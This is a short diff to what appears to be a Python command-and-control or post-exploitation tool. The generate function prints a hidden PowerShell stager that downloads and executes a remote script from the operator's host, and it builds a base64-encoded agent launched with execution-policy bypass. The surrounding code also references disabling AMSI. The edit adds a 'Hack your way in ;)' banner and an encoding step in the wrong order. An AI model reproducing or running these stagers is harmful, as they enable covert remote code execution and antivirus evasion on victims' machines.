@@ -126,15 +126,16 @@ def disable_amsi(session):
 		print colored("[-] AMSI Module is not exist !")
 
 def generate(hostname, path, proto, interval):
-    print "\npowershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)
-
+    print colored("#====================", "red")
+    print "powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)
+    print "Hack your way in ;)"
+    print colored("#====================", "red")
     f = open("agents/agent.ps1")
 
     pcode = f.read()
     pcode_edited = pcode.replace("SRVHOST", hostname).replace("OCU_INTERVAL", str(interval)).replace("OCU_PROTO", proto).encode("utf8").decode()
-    pcode_final = base64.b64encode(pcode_edited)
-    print colored("#====================\n", "red")
-    print "powershell.exe -exec bypass -enc %s" % pcode_final
+    pcode_final = base64.b64encode(pcode_edited).encode("UTF-16LE")
+
 
 
 
